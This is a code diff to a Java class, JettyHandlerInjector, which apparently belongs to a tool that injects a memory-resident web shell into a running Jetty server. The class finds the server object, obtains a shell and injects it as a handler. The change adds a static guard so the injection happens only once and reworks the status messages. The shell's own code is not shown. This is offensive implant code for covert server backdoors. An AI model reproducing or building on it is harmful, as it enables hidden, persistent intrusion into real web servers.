@@ -18,6 +18,7 @@ import java.util.zip.GZIPInputStream;
 public class JettyHandlerInjector {
 
     private String msg = "";
+    private static boolean ok = false;
 
     public String getClassName() {
         return "{{className}}";
@@ -28,15 +29,20 @@ public class JettyHandlerInjector {
     }
 
     public JettyHandlerInjector() {
+        if (ok) {
+            return;
+        }
         Object server = null;
         try {
             server = getServer();
         } catch (Throwable throwable) {
             msg += "server error: " + getErrorMessage(throwable);
         }
-        if (server != null) {
-            msg += ("server: [" + server + "] ");
+        if (server == null) {
+            msg += "server not found";
+        } else {
             try {
+                msg += ("server: [" + server + "] ");
                 Object shell = getShell(server);
                 inject(server, shell);
                 msg += "[/*] ready\n";
@@ -44,6 +50,7 @@ public class JettyHandlerInjector {
                 msg += "failed " + getErrorMessage(e) + "\n";
             }
         }
+        ok = true;
         System.out.println(msg);
     }
 
